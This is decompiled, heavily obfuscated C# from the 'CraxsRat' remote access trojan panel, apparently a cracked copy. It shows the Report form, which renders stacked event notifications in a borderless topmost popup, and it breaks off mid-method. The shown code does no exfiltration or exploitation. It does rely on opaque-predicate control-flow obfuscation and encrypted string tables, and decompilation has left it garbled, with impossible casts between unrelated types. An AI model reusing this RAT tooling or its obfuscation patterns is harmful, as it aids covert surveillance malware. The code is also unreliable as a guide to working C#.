// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Report
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Report : Form
  {
    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
label_1:
      int num1 = 1428558013;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-1168897587 * 573799133 - (-num2 - -1752270545 * (~3617728 + -(1359310483 - 1406551037))) * 2032342915 * -196740665 - 2076537051)) % 11U)
        {
          case 0:
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            num1 = (int) num3 * -88650584 ^ 2098001461;
            continue;
          case 1:
            this.FormBorderStyle = FormBorderStyle.None;
            num1 = (int) num3 * 1302811202 ^ 1070433055;
            continue;
          case 2:
            goto label_1;
          case 3:
            this.StartPosition = FormStartPosition.Manual;
            this.Text = EXGuarder.\u0031D166106;
            this.TopMost = true;
            num1 = (int) num3 * 167637557 ^ 1930066452;
            continue;
          case 4:
            goto label_3;
          case 5:
            this.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num3 * 1425244120 ^ -124777110;
            continue;
          case 6:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num3 * -293049233 ^ 842332301;
            continue;
          case 7:
            this.BackColor = Color.FromArgb(95, 95, 95);
            this.ClientSize = new Size(220, 120);
            this.ControlBox = false;
            num1 = (int) num3 * 1267946661 ^ 1709014105;
            continue;
          case 8:
            this.MaximizeBox = false;
            num1 = (int) num3 * 1725493558 ^ 1924192503;
            continue;
          case 9:
            this.ResumeLayout(false);
            num1 = (int) num3 * 684867767 ^ 590392288;
            continue;
          case 10:
            this.MinimizeBox = false;
            this.Name = EXGuarder.\u0035C752948;
            num1 = (int) num3 * -869139649 ^ 1586744271;
            continue;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:;
    }

    public virtual BackgroundWorker Bgworker
    {
      get => ((reso) this)._Bgworker;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsdsvvwwedsd);
        BackgroundWorker bgworker = ((reso) this)._Bgworker;
label_1:
        int num1 = 1033444096;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 - ((-262526889 * -1508978003 + ~-1216545381 + (-1538081621 - -955008245 ^ -163314525 * -640577561)) * 180256949 - -(~732501506 - ~2057324291) * -735136669) - ((1585680881 + 1717190121 ^ -269193324 - 2052533073) - ~(-2028300099 - 223966920) + 379655695 * ~~-1576263578))) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              ((reso) this)._Bgworker = value;
              num1 = 877398608;
              continue;
            case 2:
              bgworker = ((reso) this)._Bgworker;
              int num3 = bgworker == null ? 1522751678 : (num3 = -2058357637);
              num1 = num3 ^ (int) num2 * 1158805516;
              continue;
            case 3:
              goto label_3;
            case 4:
              bgworker.DoWork -= workEventHandler;
              num1 = (int) num2 * 2118916989 ^ 674188034;
              continue;
            case 5:
              int num4 = bgworker == null ? 12676465 : (num4 = -896466560);
              num1 = num4 ^ (int) num2 * 251384202;
              continue;
            case 6:
              bgworker.DoWork += workEventHandler;
              num1 = (int) num2 * 1353511009 ^ 436220250;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    private void FadeIn(Form o, int interval = 80)
    {
      // ISSUE: variable of a compiler-generated type
      Report.VB\u0024StateMachine_17_FadeIn stateMachine17FadeIn = (Report.VB\u0024StateMachine_17_FadeIn) new Report();
      ((RefreshExplorer.HChangeNotifyFlags) stateMachine17FadeIn).\u0024VB\u0024Me = this;
label_1:
      int num1 = 1614169954;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((~num1 * 1260538587 ^ -(354375920 + 99823669 - (-1685980813 - 1401861570))) - --1387459374 ^ -89897002 ^ -413306673) - 951707653)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            ((CustomFont) stateMachine17FadeIn).\u0024VB\u0024Local_o = o;
            ((CustomFontDrawString) stateMachine17FadeIn).\u0024VB\u0024Local_interval = interval;
            num1 = (int) num2 * 73684054 ^ -2001580644;
            continue;
          case 2:
            goto label_3;
          case 3:
            ((reso) stateMachine17FadeIn).\u0024State = -1;
            ((reso) stateMachine17FadeIn).\u0024Builder = AsyncVoidMethodBuilder.Create();
            num1 = (int) num2 * -442430801 ^ 390224974;
            continue;
          case 4:
            ((reso) stateMachine17FadeIn).\u0024Builder.Start<Report.VB\u0024StateMachine_17_FadeIn>(ref stateMachine17FadeIn);
            num1 = (int) num2 * 691661652 ^ -1023419637;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void FadeOut(Form o, int interval = 80)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Report.VB\u0024StateMachine_18_FadeOut machine18FadeOut = (Report.VB\u0024StateMachine_18_FadeOut) new Report.VB\u0024StateMachine_17_FadeIn();
label_1:
      int num1 = 807806718;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~(num1 + -~(1738865217 * (--468090245 ^ 438338899 * 1296340248)) + -(-2037222793 * (~1731022161 - 552993006 * -361916369))) * -1784054689 ^ ~-1284544081) * 792053385)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            ((RefreshExplorer.HChangeNotifyFlags) machine18FadeOut).\u0024VB\u0024Local_o = o;
            num1 = (int) num2 * 958501717 ^ -681754335;
            continue;
          case 3:
            ((RefreshExplorer.HChangeNotifyFlags) machine18FadeOut).\u0024VB\u0024Local_interval = interval;
            num1 = (int) num2 * 1697402243 ^ 1023834892;
            continue;
          case 4:
            ((RefreshExplorer.HChangeNotifyFlags) machine18FadeOut).\u0024VB\u0024Me = this;
            num1 = (int) num2 * 111299728 ^ -871634689;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      ((RefreshExplorer.HChangeNotifyFlags) machine18FadeOut).\u0024State = -1;
      ((RefreshExplorer.HChangeNotifyFlags) machine18FadeOut).\u0024Builder = AsyncVoidMethodBuilder.Create();
      ((RefreshExplorer.HChangeNotifyFlags) machine18FadeOut).\u0024Builder.Start<Report.VB\u0024StateMachine_18_FadeOut>(ref machine18FadeOut);
    }

    public void AddItem(Bitmap img, string Text)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Report._Closure\u0024__19\u002D0 closure190 = (Report._Closure\u0024__19\u002D0) new Report.VB\u0024StateMachine_18_FadeOut();
label_1:
      int num1 = -1947458719;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~(~~num1 * -165911967 + ~828102531)) % 4U)
        {
          case 0:
            ((RefreshExplorer.HChangeNotifyEventID) closure190).\u0024VB\u0024Local_img = img;
            ((RefreshExplorer.HChangeNotifyEventID) closure190).\u0024VB\u0024Local_Text = Text;
            // ISSUE: reference to a compiler-generated method
            Task task = new Task(new Action(((Report.VB\u0024StateMachine_18_FadeOut) closure190)._Lambda\u0024__R1));
            task.RunSynchronously();
            task.Wait();
            task.Dispose();
            num1 = (int) num2 * 1403801578 ^ 1180201714;
            continue;
          case 1:
            ((RefreshExplorer.HChangeNotifyEventID) closure190).\u0024VB\u0024Me = this;
            num1 = (int) num2 * 291589103 ^ 288669475;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    private object Add(Bitmap img, string Text)
    {
      // ISSUE: reference to a compiler-generated field
      object syncNotifications = Data.VB\u0024StateMachine_39_HandelData.SyncNotifications;
      ObjectFlowControl.CheckForSyncLockOnValueType(syncNotifications);
      bool flag = false;
      try
      {
        Monitor.Enter(syncNotifications, ref flag);
        if (((reso) this).Items.Count >= 60)
          ((reso) this).Items.RemoveAt(0);
        try
        {
          NativeMethods nativeMethods = new NativeMethods();
          ((getIconFrmReg) nativeMethods).FLAG = img;
          ((getIconFrmReg) nativeMethods).TEXT = Text;
          Notifications notifications = (Notifications) nativeMethods;
label_4:
          int num1 = 1246965263;
          while (true)
          {
            uint num2;
            switch ((num2 = (uint) (((-(num1 ^ --(39042127 * 1489286386) ^ -(549997210 + 665608631) + --1326492305 - -((750877015 - -1721303748) * -94499519)) ^ -(--258974516 + ~137086264)) - ((1762503344 ^ 1517320756) + (999892116 - 976564697))) * -2046487807 + 259245945)) % 4U)
            {
              case 1:
                ((reso) this).Items.Add(notifications);
                int num3 = !(((reso) this).Items.Count > 0 & !((reso) this).status) ? 206239665 : (num3 = 628869903);
                num1 = num3 ^ (int) num2 * 1323658937;
                continue;
              case 2:
                this.MyShow();
                num1 = (int) num2 * 1992511019 ^ 565081086;
                continue;
              case 3:
                goto label_4;
              default:
                goto label_14;
            }
          }
        }
        catch (InvalidOperationException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          ProjectData.ClearProjectError();
        }
      }
      finally
      {
        if (flag)
        {
label_10:
          int num4 = 925160306;
          while (true)
          {
            uint num5;
            switch ((num5 = (uint) (((-(num4 ^ --(39042127 * 1489286386) ^ -(549997210 + 665608631) + --1326492305 - -((750877015 - -1721303748) * -94499519)) ^ -(--258974516 + ~137086264)) - ((1762503344 ^ 1517320756) + (999892116 - 976564697))) * -2046487807 + 259245945)) % 3U)
            {
              case 1:
                Monitor.Exit(syncNotifications);
                num4 = (int) num5 * -235248120 ^ 1821049459;
                continue;
              case 2:
                goto label_10;
              default:
                goto label_13;
            }
          }
        }
label_13:;
      }
label_14:
      return (object) null;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsdsvwevswefd(object sender, EventArgs e)
    {
      ((reso) this).MeHand = this.Handle;
label_1:
      int num1 = 951950170;
      Rectangle workingArea;
      int x;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(~num1 * -1547907681)) % 10U)
        {
          case 0:
            x = 5;
            num1 = -1379552168;
            continue;
          case 1:
            ((reso) this).status = false;
            ((reso) this).Items = new List<Notifications>();
            int num3 = Operators.CompareString(getIconFrmReg.SHFILEINFO.LOCATION_NOTICETIGHT, EXGuarder.\u0034B246F40, false) != 0 ? -576608551 : (num3 = 847944619);
            num1 = num3 ^ (int) num2 * -393778674;
            continue;
          case 2:
            workingArea = Screen.PrimaryScreen.WorkingArea;
            x = checked (workingArea.Width - this.Width);
            num1 = (int) num2 * -578438053 ^ -1510519119;
            continue;
          case 3:
            int y = checked (workingArea.Height - this.Height);
            this.Location = new Point(x, y);
            num1 = (int) num2 * -13703386 ^ 416083577;
            continue;
          case 4:
            this.Bgworker.RunWorkerAsync();
            num1 = (int) num2 * -203717398 ^ -1595352900;
            continue;
          case 5:
            workingArea = Screen.PrimaryScreen.WorkingArea;
            num1 = -1456195772;
            continue;
          case 6:
            num1 = (int) num2 * -1845124767 ^ 1752217776;
            continue;
          case 7:
            goto label_1;
          case 8:
            this.Bgworker = new BackgroundWorker();
            int num4 = this.Bgworker.IsBusy ? 187536428 : (num4 = 1677792113);
            num1 = num4 ^ (int) num2 * -509260747;
            continue;
          case 9:
            goto label_3;
          default:
            goto label_12;
        }
      }
label_3:
      return;
label_12:;
    }

    public void MyShow() => ((reso) this).status = true;

    public void MyHide() => ((reso) this).status = false;

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsdsvvwwedsd(object sender, DoWorkEventArgs e)
    {
label_91:
      while (true)
      {
        Thread.Sleep(1);
        try
        {
          Thread.Sleep(25);
          if (((reso) this).Items.Count > 0 & ((reso) this).status)
          {
            try
            {
              // ISSUE: reference to a compiler-generated field
              object syncNotifications = Data.VB\u0024StateMachine_39_HandelData.SyncNotifications;
label_3:
              int num1 = 811676122;
              while (true)
              {
                uint num2;
                switch ((num2 = (uint) (-((num1 - ~(-(2053055408 ^ 1381034308 ^ 1251745695) * -978519227) ^ ~1611931143) + ~116362147 ^ ~--594366865) - -191854019)) % 3U)
                {
                  case 0:
                    goto label_3;
                  case 1:
                    ObjectFlowControl.CheckForSyncLockOnValueType(syncNotifications);
                    num1 = (int) num2 * -292110253 ^ -809542869;
                    continue;
                  default:
                    goto label_6;
                }
              }
label_6:
              bool flag = false;
              try
              {
                Monitor.Enter(syncNotifications, ref flag);
label_8:
                int num3 = 404406100;
                Bitmap bm;
                Graphics graphics;
                while (true)
                {
                  uint num4;
                  switch ((num4 = (uint) (-((num3 - ~(-(2053055408 ^ 1381034308 ^ 1251745695) * -978519227) ^ ~1611931143) + ~116362147 ^ ~--594366865) - -191854019)) % 6U)
                  {
                    case 0:
                      goto label_8;
                    case 2:
                      graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
                      graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
                      num3 = (int) num4 * 1455241583 ^ -2123855382;
                      continue;
                    case 3:
                      graphics.CompositingQuality = CompositingQuality.GammaCorrected;
                      num3 = (int) num4 * 2104965278 ^ -472001774;
                      continue;
                    case 4:
                      graphics.SmoothingMode = SmoothingMode.AntiAlias;
                      num3 = (int) num4 * -1609356734 ^ -1201578255;
                      continue;
                    case 5:
                      bm = new Bitmap(this.Width, this.Height);
                      graphics = Graphics.FromImage((Image) bm);
                      num3 = (int) num4 * 417911155 ^ 111523866;
                      continue;
                    default:
                      goto label_14;
                  }
                }
label_14:
                graphics.CompositingMode = CompositingMode.SourceOver;
                List<Notifications>.Enumerator enumerator1;
                try
                {
                  enumerator1 = ((reso) this).Items.GetEnumerator();
label_16:
                  int num5 = -805456359;
                  while (true)
                  {
                    uint num6;
                    Notifications current;
                    object[] Arguments;
                    Rectangle rectangle;
                    int count;
                    int num7;
                    switch ((num6 = (uint) (-((num5 - ~(-(2053055408 ^ 1381034308 ^ 1251745695) * -978519227) ^ ~1611931143) + ~116362147 ^ ~--594366865) - -191854019)) % 28U)
                    {
                      case 0:
                        ((getIconFrmReg) current).sizeHeight = ((reso) this).sizeHeightSTOP;
                        num5 = (int) num6 * 2050022726 ^ -1532856130;
                        continue;
                      case 1:
                        int num8;
                        num5 = num8 = ((getIconFrmReg) current).sizeHeight > ((reso) this).sizeHeightSTOP ? 88512374 : (num8 = 895357083);
                        continue;
                      case 2:
                        num5 = (int) num6 * 2052208390 ^ 1011959678;
                        continue;
                      case 3:
                        count = ((reso) this).Items.Count;
                        int num9;
                        num5 = num9 = count <= 60 ? -1083384444 : (num9 = -194727736);
                        continue;
                      case 4:
                        Arguments = new object[2]
                        {
                          RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(((getIconFrmReg) current).FLAG.Clone())),
                          null
                        };
                        num5 = (int) num6 * -2115418570 ^ 1367979379;
                        continue;
                      case 5:
                        current = enumerator1.Current;
                        num5 = -507564619;
                        continue;
                      case 6:
                        int num10;
                        num5 = num10 = count <= 15 ? -756006052 : (num10 = -492435677);
                        continue;
                      case 7:
                        ((getIconFrmReg) current).sizeHeight = ((reso) this).sizeHeightSTOP;
                        num5 = (int) num6 * -1458181601 ^ -1415787913;
                        continue;
                      case 8:
                        ((getIconFrmReg) current).sizeHeight = checked (((getIconFrmReg) current).sizeHeight - 1);
                        num5 = -1107139630;
                        continue;
                      case 9:
                        int height = checked ((int) Math.Round(unchecked ((double) graphics.MeasureString(((getIconFrmReg) current).TEXT, Settings.f).Height + (double) ((reso) this).sizeFontHeight)));
                        rectangle = new Rectangle(0, ((getIconFrmReg) current).sizeHeight, this.Width, height);
                        num5 = (int) num6 * -127814045 ^ -1195277152;
                        continue;
                      case 10:
                        ((getIconFrmReg) current).sizeHeight = ((reso) this).sizeHeightSTOP;
                        num5 = (int) num6 * -781448089 ^ -1221822166;
                        continue;
                      case 11:
                        int num11;
                        num5 = num11 = count <= 20 ? -456773727 : (num11 = 406277349);
                        continue;
                      case 12:
                        ((getIconFrmReg) current).sizeHeight = checked (((getIconFrmReg) current).sizeHeight - 8);
                        num5 = (int) num6 * -452323796 ^ 2136644706;
                        continue;
                      case 14:
                        int num12 = ((getIconFrmReg) current).sizeHeight > ((reso) this).sizeHeightSTOP ? 2037826498 : (num12 = 2000993523);
                        num5 = num12 ^ (int) num6 * -679902015;
                        continue;
                      case 15:
                        goto label_16;
                      case 16:
                        Point point = new Point(checked (this.Width - ((getIconFrmReg) current).FLAG.Width - 7), checked (((getIconFrmReg) current).sizeHeight + ((reso) this).sizeFontHeight));
                        Arguments[1] = (object) point;
                        NewLateBinding.LateCall((object) graphics, (Type) null, EXGuarder.\u003416B3B09, Arguments, (string[]) null, (Type[]) null, (bool[]) null, true);
                        num5 = (int) num6 * 339982117 ^ -570131586;
                        continue;
                      case 17:
                        num5 = (int) num6 * -2076145878 ^ -3803960;
                        continue;
                      case 18:
label_53:
                        if (!enumerator1.MoveNext())
                        {
                          num7 = 433520656;
                          goto label_52;
                        }
                        else
                          goto case 5;
                      case 19:
                        int num13;
                        num5 = num13 = count <= 10 ? 667411469 : (num13 = 835350998);
                        continue;
                      case 20:
                        rectangle = new Rectangle(0, checked (((getIconFrmReg) current).sizeHeight - ((reso) this).sizeFontHeight), 0, 0);
                        ControlPaint.DrawLockedFrame(graphics, rectangle, false);
                        num5 = (int) num6 * -1061940284 ^ 2017642751;
                        continue;
                      case 21:
                        SizeF sizeF = new SizeF();
                        num5 = -391225306;
                        continue;
                      case 22:
                        int num14;
                        num5 = num14 = count <= 5 ? -867127681 : (num14 = -1010756000);
                        continue;
                      case 23:
                        ((getIconFrmReg) current).sizeHeight = checked (((getIconFrmReg) current).sizeHeight - 2);
                        num5 = (int) num6 * -1538165776 ^ -1309496830;
                        continue;
                      case 24:
                        LinearGradientBrush linearGradientBrush = new LinearGradientBrush(rectangle, ((reso) this).ColorBack, ((reso) this).ColorBack, LinearGradientMode.BackwardDiagonal);
                        GraphicsPath path = this.RoundRect(rectangle, Operators.CompareString(Settings.NOTI_Round, EXGuarder.\u00372421D49, false) == 0 ? 12 : 1);
                        graphics.FillPath((Brush) linearGradientBrush, path);
                        num5 = -506868449;
                        continue;
                      case 25:
                        ((getIconFrmReg) current).sizeHeight = checked (((getIconFrmReg) current).sizeHeight - 4);
                        num5 = (int) num6 * 798256881 ^ -1899911777;
                        continue;
                      case 26:
                        ((getIconFrmReg) current).sizeHeight = checked (((getIconFrmReg) current).sizeHeight - 14);
                        num5 = (int) num6 * -632194943 ^ 997602679;
                        continue;
                      case 27:
                        num5 = (int) num6 * 1901939847 ^ -2146312733;
                        continue;
                      default:
                        SolidBrush solidBrush = new SolidBrush(((reso) this).ColorFont);
                        try
                        {
                          graphics.DrawString(((getIconFrmReg) current).TEXT, Settings.f, (Brush) solidBrush, (float) ((reso) this).sizeFontWidth, (float) checked (((getIconFrmReg) current).sizeHeight + ((reso) this).sizeFontHeight));
                        }
                        finally
                        {
                          if (solidBrush != null)
                          {
label_46:
                            int num15 = -331215784;
                            while (true)
                            {
                              uint num16;
                              switch ((num16 = (uint) (-((num15 - ~(-(2053055408 ^ 1381034308 ^ 1251745695) * -978519227) ^ ~1611931143) + ~116362147 ^ ~--594366865) - -191854019)) % 3U)
                              {
                                case 1:
                                  solidBrush.Dispose();
                                  num15 = (int) num16 * -712821442 ^ -1430438337;
                                  continue;
                                case 2:
                                  goto label_46;
                                default:
                                  goto label_49;
                              }
                            }
                          }
label_49:;
                        }
                        if (((getIconFrmReg) current).sizeHeight > checked (this.Height - 50))
                          goto label_56;
                        else
                          break;
                    }
label_51:
                    num7 = 1590310082;
label_52:
                    uint num17;
                    switch ((num17 = (uint) (-((num7 - ~(-(2053055408 ^ 1381034308 ^ 1251745695) * -978519227) ^ ~1611931143) + ~116362147 ^ ~--594366865) - -191854019)) % 3U)
                    {
                      case 1:
                        goto label_53;
                      case 2:
                        goto label_51;
                      default:
                        goto label_56;
                    }
                  }
                }
                finally
                {
                  enumerator1.Dispose();
                }
label_56:
                List<Notifications>.Enumerator enumerator2;
                try
                {
                  while (true)
                  {
                    enumerator2 = ((reso) this).Items.GetEnumerator();
label_57:
                    int num18 = -188246776;
                    int num19;
                    Notifications current;
                    while (true)
                    {
                      uint num20;
                      switch ((num20 = (uint) (-((num18 - ~(-(2053055408 ^ 1381034308 ^ 1251745695) * -978519227) ^ ~1611931143) + ~116362147 ^ ~--594366865) - -191854019)) % 12U)
                      {
                        case 0:
                          num18 = (int) num20 * -804883634 ^ 1342700507;
                          continue;
                        case 1:
                          int num21 = ((getIconFrmReg.SHFILEINFO) current).startTime ? 1499071951 : (num21 = 2041603923);
                          num18 = num21 ^ (int) num20 * 191367523;
                          continue;
                        case 2:
                          int num22 = num19 < 0 ? -1084655747 : (num22 = 674710236);
                          num18 = num22 ^ (int) num20 * 1849422509;
                          continue;
                        case 3:
                          num18 = (int) num20 * 227486953 ^ -1511834663;
                          continue;
                        case 5:
                          current = enumerator2.Current;
                          num18 = 202751562;
                          continue;
                        case 6:
                          ((getIconFrmReg.SHFILEINFO) current).startTime = true;
                          num18 = (int) num20 * 1678828010 ^ 2107982132;
                          continue;
                        case 7:
                          ((getIconFrmReg.SHFILEINFO) current).start = DateTime.Now.AddSeconds((double) ((reso) this).timeOut);
                          num18 = (int) num20 * 1987754972 ^ 1193701097;
                          continue;
                        case 8:
                          goto label_63;
                        case 9:
                          int num23;
                          num18 = num23 = enumerator2.MoveNext() ? -101140238 : (num23 = -523706889);
                          continue;
                        case 10:
                          goto label_57;
                        case 11:
                          num19 = DateTime.Compare(((getIconFrmReg.SHFILEINFO) current).start, DateTime.Now);
                          num18 = -55770659;
                          continue;
                        default:
                          goto label_70;
                      }
                    }
label_63:
                    ((reso) this).Items.Remove(current);
                  }
                }
                finally
                {
                  enumerator2.Dispose();
                }
label_70:
                if (!(((reso) this).Items.Count == 0 & ((reso) this).status))
                  goto label_73;
label_71:
                int num24 = -104036934;
label_72:
                while (true)
                {
                  uint num25;
                  switch ((num25 = (uint) (-((num24 - ~(-(2053055408 ^ 1381034308 ^ 1251745695) * -978519227) ^ ~1611931143) + ~116362147 ^ ~--594366865) - -191854019)) % 6U)
                  {
                    case 1:
                      bm = (Bitmap) null;
                      num24 = (int) num25 * -1912916622 ^ 1153025960;
                      continue;
                    case 2:
                      goto label_73;
                    case 3:
                      goto label_71;
                    case 4:
                      graphics.Dispose();
                      num24 = (int) num25 * 225758378 ^ 281205149;
                      continue;
                    case 5:
                      this.MyHide();
                      num24 = (int) num25 * 984215638 ^ -50579285;
                      continue;
                    default:
                      goto label_77;
                  }
                }
label_77:
                this.UpdateWindow(bm);
                continue;
label_73:
                graphics.Flush(FlushIntention.Sync);
                num24 = -1069190649;
                goto label_72;
              }
              finally
              {
                if (flag)
                {
label_79:
                  int num26 = -898436970;
                  while (true)
                  {
                    uint num27;
                    switch ((num27 = (uint) (-((num26 - ~(-(2053055408 ^ 1381034308 ^ 1251745695) * -978519227) ^ ~1611931143) + ~116362147 ^ ~--594366865) - -191854019)) % 3U)
                    {
                      case 1:
                        Monitor.Exit(syncNotifications);
                        num26 = (int) num27 * -1751789966 ^ 222412473;
                        continue;
                      case 2:
                        goto label_79;
                      default:
                        goto label_82;
                    }
                  }
                }
label_82:;
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
label_84:
              int num28 = 504095798;
              while (true)
              {
                uint num29;
                switch ((num29 = (uint) (-((num28 - ~(-(2053055408 ^ 1381034308 ^ 1251745695) * -978519227) ^ ~1611931143) + ~116362147 ^ ~--594366865) - -191854019)) % 3U)
                {
                  case 0:
                    goto label_84;
                  case 2:
                    ProjectData.ClearProjectError();
                    num28 = (int) num29 * -307237716 ^ -1490514189;
                    continue;
                  default:
                    goto label_91;
                }
              }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
label_88:
          int num30 = -528491948;
          while (true)
          {
            uint num31;
            switch ((num31 = (uint) (-((num30 - ~(-(2053055408 ^ 1381034308 ^ 1251745695) * -978519227) ^ ~1611931143) + ~116362147 ^ ~--594366865) - -191854019)) % 3U)
            {
              case 1:
                ProjectData.ClearProjectError();
                num30 = (int) num31 * 1327149299 ^ 645153377;
                continue;
              case 2:
                goto label_88;
              default:
                goto label_91;
            }
          }
        }
      }
    }

    private void Report_MouseClick(object sender, MouseEventArgs e)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Report.VB\u0024StateMachine_25_Report_MouseClick reportMouseClick = (Report.VB\u0024StateMachine_25_Report_MouseClick) new Report._Closure\u0024__19\u002D0();
label_1:
      int num1 = 632420414;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-((-num1 + (~(1636128416 - 884180322 - (1642574333 - 415471230)) - (-110882339 ^ ~(-1078221045 - 1849824021))) ^ ~(-1432901507 * -47801924 * 1114968059)) * 1937918547) - 355601300)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            ((RefreshExplorer.HChangeNotifyEventID) reportMouseClick).\u0024VB\u0024Me = this;
            num1 = (int) num2 * 1529732206 ^ 1303611713;
            continue;
          case 2:
            ((RefreshExplorer.HChangeNotifyEventID) reportMouseClick).\u0024VB\u0024Local_sender = sender;
            ((RefreshExplorer.HChangeNotifyEventID) reportMouseClick).\u0024VB\u0024Local_e = e;
            ((RefreshExplorer.HChangeNotifyEventID) reportMouseClick).\u0024State = -1;
            ((RefreshExplorer.HChangeNotifyEventID) reportMouseClick).\u0024Builder = AsyncVoidMethodBuilder.Create();
            num1 = (int) num2 * 619505542 ^ 1881481636;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      ((RefreshExplorer.HChangeNotifyEventID) reportMouseClick).\u0024Builder.Start<Report.VB\u0024StateMachine_25_Report_MouseClick>(ref reportMouseClick);
    }

    private object AllClear()
    {
      // ISSUE: reference to a compiler-generated field
      object syncNotifications = Data.VB\u0024StateMachine_39_HandelData.SyncNotifications;
label_1:
      int num1 = -328569191;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 ^ (-(1825385841 * -2045135845 - ~-1694001232) - ((-95555066 ^ 1733929930 ^ 1093064792 - 1477754065) + (-1876186927 - 1375138860 ^ -492779479 - 1411947184))) * 1845974179 ^ (-1041898599 * (963975255 * -1827033644) ^ -1149327197 * -1529059031 - --101352963) * 2052888973) - (~-1430959628 - -1641008818 * -1167652779 ^ -1343102926))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            ObjectFlowControl.CheckForSyncLockOnValueType(syncNotifications);
            num1 = (int) num2 * 438048970 ^ -637342793;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      bool flag = false;
      try
      {
        Monitor.Enter(syncNotifications, ref flag);
label_6:
        int num3 = 1695242565;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) ((num3 ^ (-(1825385841 * -2045135845 - ~-1694001232) - ((-95555066 ^ 1733929930 ^ 1093064792 - 1477754065) + (-1876186927 - 1375138860 ^ -492779479 - 1411947184))) * 1845974179 ^ (-1041898599 * (963975255 * -1827033644) ^ -1149327197 * -1529059031 - --101352963) * 2052888973) - (~-1430959628 - -1641008818 * -1167652779 ^ -1343102926))) % 3U)
          {
            case 0:
              goto label_6;
            case 1:
              ((reso) this).Items.Clear();
              this.BitmapClean();
              num3 = (int) num4 * -124123902 ^ 2045358987;
              continue;
            default:
              goto label_9;
          }
        }
label_9:
        this.MyHide();
      }
      finally
      {
        if (flag)
        {
label_11:
          int num5 = -986081240;
          while (true)
          {
            uint num6;
            switch ((num6 = (uint) ((num5 ^ (-(1825385841 * -2045135845 - ~-1694001232) - ((-95555066 ^ 1733929930 ^ 1093064792 - 1477754065) + (-1876186927 - 1375138860 ^ -492779479 - 1411947184))) * 1845974179 ^ (-1041898599 * (963975255 * -1827033644) ^ -1149327197 * -1529059031 - --101352963) * 2052888973) - (~-1430959628 - -1641008818 * -1167652779 ^ -1343102926))) % 3U)
            {
              case 0:
                goto label_11;
              case 1:
                Monitor.Exit(syncNotifications);
                num5 = (int) num6 * -1766738813 ^ 381554932;
                continue;
              default:
                goto label_14;
            }
          }
        }
label_14:;
      }
      return (object) null;
    }

    public GraphicsPath RoundRect(Rectangle Rectangle, int Curve)
    {
      GraphicsPath graphicsPath1 = new GraphicsPath();
      graphicsPath1.AddArc(checked (Rectangle.X + Rectangle.Width - Curve), Rectangle.Y, Curve, Curve, 270f, 90f);
label_1:
      int num1 = 1645071595;
      GraphicsPath graphicsPath2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~(num1 - ---(~888466006 ^ -222576485) + --(~-284541533 ^ -1293050366 - 891021155) - 1093965543) - 1273110573)) % 5U)
        {
          case 0:
            graphicsPath2 = graphicsPath1;
            num1 = (int) num2 * 1129863956 ^ 124252797;
            continue;
          case 1:
            graphicsPath1.AddArc(checked (Rectangle.X + Rectangle.Width - Curve), checked (Rectangle.Y + Rectangle.Height - Curve), Curve, Curve, 0.0f, 90f);
            graphicsPath1.AddArc(Rectangle.X, checked (Rectangle.Y + Rectangle.Height - Curve), Curve, Curve, 90f, 90f);
            graphicsPath1.AddArc(Rectangle.X, Rectangle.Y, Curve, Curve, 180f, 90f);
            num1 = (int) num2 * -393781348 ^ -1642007629;
            continue;
          case 2:
            goto label_1;
          case 3:
